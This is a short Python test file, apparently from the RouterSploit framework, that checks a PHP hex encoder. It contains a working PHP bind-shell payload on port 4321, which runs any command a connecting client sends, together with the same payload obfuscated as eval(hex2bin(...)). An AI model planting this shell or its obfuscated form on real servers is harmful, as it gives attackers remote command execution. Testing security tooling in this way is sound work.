from routersploit.modules.encoders.php.hex import Encoder


# php bind tcp payload with rport 4321
bind_tcp = (
    "$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);" +
    "socket_bind($s,\"0.0.0.0\",4321);" +
    "socket_listen($s,1);" +
    "$cl=socket_accept($s);" +
    "while(1){" +
    "if(!socket_write($cl,\"$ \",2))exit;" +
    "$in=socket_read($cl,100);" +
    "$cmd=popen(\"$in\",\"r\");" +
    "while(!feof($cmd)){" +
    "$m=fgetc($cmd);" +
    "socket_write($cl,$m,strlen($m));" +
    "}}"
)

# php bind tcp payload with rport=4321 encoded with php/hex
bind_tcp_encoded = (
    "eval(hex2bin('24733d736f636b65745f6372656174652841465f494e45542c534f434b5f53545245414d2c534f4c5f544350293b736f636b65745f62696e642824732c22302e302e302e30222c34333231293b736f636b65745f6c697374656e2824732c31293b24636c3d736f636b65745f616363657074282473293b7768696c652831297b69662821736f636b65745f77726974652824636c2c222420222c322929657869743b24696e3d736f636b65745f726561642824636c2c313030293b24636d643d706f70656e282224696e222c227222293b7768696c65282166656f662824636d6429297b246d3d66676574632824636d64293b736f636b65745f77726974652824636c2c246d2c7374726c656e28246d29293b7d7d'));"
)


def test_payload_encoding():
    """ Test scenario - payload encoding """

    encoder = Encoder()
    assert encoder.encode(bind_tcp) == bind_tcp_encoded
